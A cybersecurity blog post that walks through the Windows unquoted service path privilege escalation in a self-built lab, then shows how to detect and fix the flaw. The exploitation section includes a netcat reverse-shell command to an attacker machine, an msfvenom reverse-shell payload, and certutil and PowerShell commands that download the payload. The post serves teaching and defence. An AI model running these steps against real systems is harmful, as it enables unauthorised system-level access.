<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Unquoted Service Path Vulnerability" /><meta name="author" content="krygennn" /><meta property="og:locale" content="en" /><meta name="description" content="What is Unquoted Service Path ?" /><meta property="og:description" content="What is Unquoted Service Path ?" /><link rel="canonical" href="https://krygennn.github.io/posts/unquoted-service-path-vulnerability/" /><meta property="og:url" content="https://krygennn.github.io/posts/unquoted-service-path-vulnerability/" /><meta property="og:site_name" content="Burak Baris" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-23T00:59:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Unquoted Service Path Vulnerability" /><meta name="twitter:site" content="@Krygen2" /><meta name="twitter:creator" content="@krygennn" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"krygennn"},"description":"What is Unquoted Service Path ?","url":"https://krygennn.github.io/posts/unquoted-service-path-vulnerability/","@type":"BlogPosting","headline":"Unquoted Service Path Vulnerability","dateModified":"2021-12-25T16:41:57+00:00","datePublished":"2021-12-23T00:59:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://krygennn.github.io/posts/unquoted-service-path-vulnerability/"},"@context":"https://schema.org"}</script><title>Unquoted Service Path Vulnerability | Burak Baris</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Burak Baris"><meta name="application-name" content="Burak Baris"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Burak Baris</a></div><div class="site-subtitle font-italic">krygeNNN / Cyber Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/cv/" class="nav-link"> <i class="fa-fw fas fa-file ml-xl-3 mr-xl-3 unloaded"></i> <span>CV</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/krygeNNN" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Krygen2" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['imbarisburak','protonmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/burak-baris" aria-label="linkedin" class="order-6" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-7" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Unquoted Service Path Vulnerability</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Unquoted Service Path Vulnerability</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> krygennn </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Dec 23, 2021, 12:59 AM +0000" >Dec 23<i class="unloaded">2021-12-23T00:59:00+00:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Dec 25, 2021, 4:41 PM +0000" >Dec 25<i class="unloaded">2021-12-25T16:41:57+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1610 words">8 min read</span></div></div><div class="post-content"><h1 id="what-is-unquoted-service-path-">What is Unquoted Service Path ?</h1><p><strong>Unquoted Service Path</strong> is a vulnerability that occurs when a service is created with a <strong>service path</strong> without appropriate quoting surrounding the path string, and if the path contains spaces, that can end up with a <strong>privilege escalation</strong> with the permissions of whoever created the service.</p><h1 id="how-it-works-">How it works ?</h1><p>Typically <a href="https://en.wikipedia.org/wiki/Service_Control_Manager"><strong>Service Control Manager</strong></a> will run the service’s executable by looking at its full path.</p><ul><li>Path of the safe service -&gt; “C:\Program Files\a folder\b folder\c folder\vulnservice.exe”</ul><p>The service control manager will execute vulnservice.exe due to the fact that the path has appropriate quoting. <br />Basically, the system will interpret the path as a full string. <br /> <br /> However, if the full path of the service file is not enclosed within quotation marks just like the following example:</p><ul><li>Path of the vulnerable service -&gt; C:\Program Files\a folder\b folder\c folder\vulnservice.exe</ul><p>This time, for each space in the path, the system will append the <strong>.exe</strong> extension at the end of the most recent space. Thus the first string chunk of the folder name will be treated as an executable. <br />Interpretation would be as following:</p><ol><li>C:\<strong>Program.exe</strong><li>C:\Program Files\<strong>a.exe</strong> : If Progam.exe does not exist, execute a.exe<li>C:\Program Files\a folder\<strong>b.exe</strong> : If a.exe does not exist, execute b.exe<li>C:\Program Files\a folder\b folder\<strong>c.exe</strong> : If b.exe does not exist, execute c.exe<li>C:\Program Files\a folder\b folder\c folder\<strong>vulnservice.exe</strong> : If c.exe does not exist, execute vulnservice.exe</ol><h1 id="how-to-exploit-it-">How to exploit it ?</h1><p>Consider that you have gained a shell from a low privileged user in the system. However that user has the write permission for one of these subfolders. Then you can deploy a malicious executable inside that subfolder by naming it with the the first string chunk of its child folder.</p><p><br />Lets assume that the user that you have gained access to has the write permission for the b folder. If you create a malware named a.exe and drop it inside the b folder, the system will run your executable at the next run of the service.</p><h1 id="setting-the-lab">Setting the Lab</h1><p>In order to exploit the vulnerability, we need to create one. <br /></p><p>Open up the start menu, and launch a command prompt by running it as an administrator. <br /><img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/1.jpg" alt="" /><br /><br /></p><p>Create a low privileged user: <code class="language-plaintext highlighter-rouge">net user krygen krygen /add</code> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/2.jpg" alt="" /><br /><br /> Press <strong>Win+R</strong>, and run <code class="language-plaintext highlighter-rouge">lusrmgr.src</code>, to see all users and groups in the system. <br />You can see the user krygen has been created successfully. <br />It is also possbile to run <code class="language-plaintext highlighter-rouge">net user krygen</code> to get same information from the command line. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/3.jpg" alt="" /><br /><br /> And the account belongs to the <strong>Users Group</strong>. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/4.jpg" alt="" /><br /><br /> To create a vulnerable service run this command: <br /><code class="language-plaintext highlighter-rouge">sc create "Vuln Service" binpath= "C:\Proogram Files\a folder\b folder\c folder\vulnservice.exe" Displayname= "Vulnerable Service" start= auto</code> <br /></p><ul><li>sc.exe is the utility to create and interact with the services.<li>binpath is the path of the binary executable of the service.<li>Displayname is not mandatory, if you leave it blank, it will take the name of the service.<li>start is the start type, it can be either auto or manual.</ul><p><img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/5.jpg" alt="" /><br /><br /> <br /> We can see the details of any service by runnig <code class="language-plaintext highlighter-rouge">sc qc {SERVICE NAME}</code>. <br />Important fields to notice:</p><ul><li>START_TYPE = AUTO_START -&gt; Service will start automatically when the sytem boots.<li>SERVICE_START_NAME = LocalSystem -&gt; Service will start with the LocalSystem service account privileges.</ul><p><a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN"><strong>LocalSystem</strong></a> is a service account, and it has the highest privileges of the system, which is the system root. <br /> Read more about <a href="https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco"><strong>Microsoft Service Accounts</strong></a>. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/6.jpg" alt="" /><br /><br /> Let create directories which is declared as a path for our service. <br /><code class="language-plaintext highlighter-rouge">mkdir "C:\Program Files\a folder\b folder\c folder"</code> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/7.jpg" alt="" /><br /><br /> As you can see, it is not possible to start the service since the there is no executable in path. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/8.jpg" alt="" /><br /><br /></p><p>I will create two executables, both will delete different txt files from a specified path. <br />One will delete <strong>burak.txt</strong> and the other, <strong>krygen.txt</strong>, for every 3 seconds. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/9.jpg" alt="" /><em>Source code for vulnservice.exe</em><br /><br /> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/10.jpg" alt="" /><em>Source code for b.exe</em><br /><br /> I have compiled both C codes with GCC and converted them into executables. <br /><a href="https://sourceforge.net/projects/gcc-win64/"><strong>Download gcc compiler</strong></a> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/11.jpg" alt="" /><br /><br /></p><p>Put the <strong>vulnservice.exe</strong> into the <strong>c folder</strong>. When I start the service manually, starting from <strong>C:\</strong>, the system will try to execute Program.exe then a.exe, then b.exe, then c.exe.However, none of them will be found. Thus vulnservice.exe will be executed as expected behaviour. <br /><br /> Let run the service: <code class="language-plaintext highlighter-rouge">sc start "Vuln Service"</code> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/12.jpg" alt="" /><em>First run: 0th second</em><br /><br /> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/13.jpg" alt="" /><em>3rd second</em><br /><br /></p><p>Now put b.exe in a folder, then start the service again. <br />Remember the execution the we have discussed at the beginning. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/14.jpg" alt="" /><em>First run: 0th second</em><br /><br /> As you can see, this time krygen.txt had been deleted instead of burak.txt, which is catastrophic for the system, but it was what we were expecting. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/15.jpg" alt="" /><em>3rd second</em></p><h1 id="exploitation">Exploitation</h1><p>We have set the environment up. However, until now, we had access to admin privileges. Thus we were able to start the service manually and write any of the subdirectories of the service path. <br />As the name suggests <strong>privilege escalation</strong>, is about raising our permissions to the LocalSystem/root permissions from a lower privileged user. There is no point to exploit a vulnerability after you have complete control over the system. <br /><br /> Let’s check the the <a href="https://networkencyclopedia.com/access-control-list-acl/"><strong>ACL(Access Control List)</strong></a> of the ‘C:\Program Files\a folder’ with <a href="https://www.techtarget.com/searchwindowsserver/definition/icacls"><strong>icacls</strong></a>. <br />Run <code class="language-plaintext highlighter-rouge">icacls "C:\Program Files\a folder"</code></p><p><br />The Users Group entry, <strong>BUILTIN\Users:(I)(RX)</strong>, gives access <strong>read</strong> and <strong>execute</strong> permissions for every user who belongs to <strong>Users Group</strong>. The <strong>krygen</strong> user we have created at the beginning of the post belongs to the Users Group. However, for the vulnerability to occur ,Users Group needs the <strong>write</strong> permission for any of those subfolders, a,b or c, it does not matter which. For this example I will use <strong>a folder</strong>. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/16.jpg" alt="" /><br /><br /></p><p>Let us grant write access to Users Group for <strong>a folder</strong>. <br />Run <code class="language-plaintext highlighter-rouge">icacls "C:\Program Files\a folder" /grant "BUILTIN\Users":W</code> <br />Now run <code class="language-plaintext highlighter-rouge">icacls "C:\Program Files\a folder"</code> again. This time you will see a new entry <strong>BUILTIN\Users:(W)</strong> <br />Now the user we have created, krygen, can write to that specific directory. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/17.jpg" alt="" /><br /><br /></p><p>Log in to the system with the account that you have created which belongs to the Users Group, for me it is krygen user. <br />We will assume that, somehow you have gained accessed to the system as the user krygen. <br />I will use <a href="https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe"><strong>netcat</strong></a> in order to establish a connection and take a shell from krygen to my attacker machine. <br />Run <code class="language-plaintext highlighter-rouge">nc -nvlp {SOME FREE PORT}</code> on the attacker machine. <br />Run <code class="language-plaintext highlighter-rouge">nc -e cmd.exe {IP OF THE ATTACKER MACHINE} {PORT THE ATTACKER MACHINE LISTENS TO}</code> on the windows machine. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/18.jpg" alt="" /><br /><br /> Now that we have access to the krygen’s shell, we can try to write to all those a,b and c folders by attempting to create a new folder in each of them to test which one of them is accessible. We already know it is <strong>a folder</strong>, no harm double-checking.</p><p><img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/19.jpg" alt="" /><em>Folder creation is successfull inside ‘a folder’</em><br /><br /> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/20.jpg" alt="" /><em>Failed to create folder inside ‘b folder’</em><br /><br /> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/21.jpg" alt="" /><em>Failed to create folder inside ‘c folder’</em><br /><br /></p><p>Since the directory that we can write is the <strong>a folder</strong>, if we want the service to execute our binary executable instead of the service file, the name of the malicious executable should be the first chunk of the child directory, which is <strong>b</strong>.exe. <br /> I am going to use <a href="https://www.offensive-security.com/metasploit-unleashed/Msfvenom/"><strong>msfvenom</strong></a> to create a reverse shell binary back to my machine.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Parameter<th style="text-align: left">Functionality<tbody><tr><td style="text-align: left">LHOST<td style="text-align: left">The IP address that the reverse shell will connect<tr><td style="text-align: left">LPORT<td style="text-align: left">The port that the reverse shell will connect<tr><td style="text-align: left">-p<td style="text-align: left">Payload to use<tr><td style="text-align: left">-o<td style="text-align: left">Name of the file<tr><td style="text-align: left">-f<td style="text-align: left">File type of the output binary</table></div><p><img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/22.jpg" alt="" /><br /><br /></p><p>Now we need to download the executable to the victim machine. <br />Run <code class="language-plaintext highlighter-rouge">python -m http.server 80</code> in the directory that your executable locates. It will start a web server inside of that directory.</p><p><img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/23.jpg" alt="" /><br /><br /> <br />You can download any file from the running python server by using one of these utilites. <br /> - <code class="language-plaintext highlighter-rouge">powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</code> <br /> - <code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}</code> <br />Double-check to see if the executable downloaded successfully into the directory to which you have the write access.</p><p><img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/24.jpg" alt="" /><br /><br /> Start a <strong>netcat</strong> listener on the port you declared in the reverse shell binary.</p><p><img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/25.jpg" alt="" /><br /><br /></p><p>Since we do not have <strong>LocalSystem</strong> permissions, it is impossible to start the service manually. However, the start type of the service is <strong>AUTO_START</strong>. Thus the service will be initialized at the system boot. All we have to do is reboot the system and wait for the connection to establish. <br />Run <code class="language-plaintext highlighter-rouge">sutdown /r /t 0</code> <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/27.jpg" alt="" /><br /><br /></p><p>Hurray ! The connection has been established successfully, even though no login had not yet been attempted on the windows machine. The path we are in is <strong>system32</strong>, which means we have the console with administrator rights, have fun after that point :))). <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/28.jpg" alt="" /><br /><br /></p><h1 id="how-to-fix-it-">How to fix it ?</h1><p>First of all, run: <br /><code class="language-plaintext highlighter-rouge">wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\" | findstr /i /v """</code> <br /> to see if there is any service with an unquoted path variable. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/29.jpg" alt="" /><br /><br /></p><p>If there is, then run <code class="language-plaintext highlighter-rouge">Win+R</code> and type <code class="language-plaintext highlighter-rouge">regedit.exe</code>, press enter. <br />In the directory tree, search for the vulnerable service name under:<br /> <strong>Computer\HKEY_LOCAL_MACHINE\SYSTEM \ControlSet\Services\{SERVICE NAME}</strong>. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/31.jpg" alt="" /><br /><br /></p><p>Find the <strong>ImagePath</strong> entry, double click it. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/32.jpg" alt="" /><br /><br /></p><p>Change its value by surrounding the string with quotes. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/33.jpg" alt="" /><br /><br /></p><p>Run: <br /><code class="language-plaintext highlighter-rouge">wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\" | findstr /i /v """</code> <br /> again, this time you should not see any results, you have fixed it. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/34.jpg" alt="" /><br /><br /></p><h1 id="how-to-prevent-it-">How to prevent it ?</h1><p>How on the world I can create a safe service ? <br /> Simple, when creating a service with <code class="language-plaintext highlighter-rouge">sc.exe</code>, do not pass the parameter for <strong>binpath</strong> like this:</p><ul><li><code class="language-plaintext highlighter-rouge">binpath= "C:\Program Files\a folder\b folder\c folder"</code></ul><p>instead, do it like this:</p><ul><li><code class="language-plaintext highlighter-rouge">binpath= "\"C:\Program Files\a folder\b folder\c folder"\"</code></ul><p>Enjoy your safely created service. <img data-proofer-ignore data-src="/assets/img/posts/unquoted-service-path-vulnerability/35.jpg" alt="" /><br /><br /></p><p>Thanks for reading.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/cyber-security/'>cyber-security</a>, <a href='/categories/operating-systems/'>Operating-Systems</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows-privesc/" class="post-tag no-text-decoration" >windows-privesc</a> <a href="/tags/unqoted-service-path/" class="post-tag no-text-decoration" >unqoted-service-path</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Unquoted Service Path Vulnerability - Burak Baris&url=https://krygennn.github.io/posts/unquoted-service-path-vulnerability/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Unquoted Service Path Vulnerability - Burak Baris&u=https://krygennn.github.io/posts/unquoted-service-path-vulnerability/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Unquoted Service Path Vulnerability - Burak Baris&url=https://krygennn.github.io/posts/unquoted-service-path-vulnerability/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://krygennn.github.io/posts/unquoted-service-path-vulnerability/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/unquoted-service-path-vulnerability/">Unquoted Service Path Vulnerability</a><li><a href="/posts/ipv4-addresses/">IPv4 Protocol</a><li><a href="/posts/tryhackme-steel-mountain-ctf-writeup/">Tryhackme Steel Mountain CTF Writeup</a><li><a href="/posts/tryhackme-blue-ctf-writeup/">Tryhackme Blue Ctf Writeup</a><li><a href="/posts/subnetting/">Subnetting</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/remote-code-execution/">remote-code-execution</a> <a class="post-tag" href="/tags/unqoted-service-path/">unqoted-service-path</a> <a class="post-tag" href="/tags/windows-privesc/">windows-privesc</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/arch-linux/">arch-linux</a> <a class="post-tag" href="/tags/boot-managers/">boot-managers</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-steel-mountain-ctf-writeup/"><div class="card-body"> <span class="timeago small" >Dec 23<i class="unloaded">2021-12-23T00:50:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme Steel Mountain CTF Writeup</h3><div class="text-muted small"><p> Solve Yourself » The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit two different vulnerabilities that occur on the system. FIRST METHOD 1-Prepe...</p></div></div></a></div><div class="card"> <a href="/posts/add-windows-boot-manager-to-grub/"><div class="card-body"> <span class="timeago small" >Nov 18<i class="unloaded">2021-11-18T12:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Add Windows Boot Manager to Grub</h3><div class="text-muted small"><p> If you want to add windows boot manager to grub, follow these steps; 1-Download os-prober 2-Run sudo os-prober If you see something like that, you are good to go. -&gt; sudo os-prober /dev/nvme1n1...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-blue-ctf-writeup/"><div class="card-body"> <span class="timeago small" >Oct 9<i class="unloaded">2021-10-09T00:59:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme Blue Ctf Writeup</h3><div class="text-muted small"><p> Solve Yourself » Blue is a machine that specifically designed to cover EternalBlue (CVE-2017-0144), which allows remote attackers to execute arbitrary code via crafted packets, aka “Windows SMB ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-steel-mountain-ctf-writeup/" class="btn btn-outline-primary" prompt="Older"><p>Tryhackme Steel Mountain CTF Writeup</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/Krygen2">Burak Baris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> 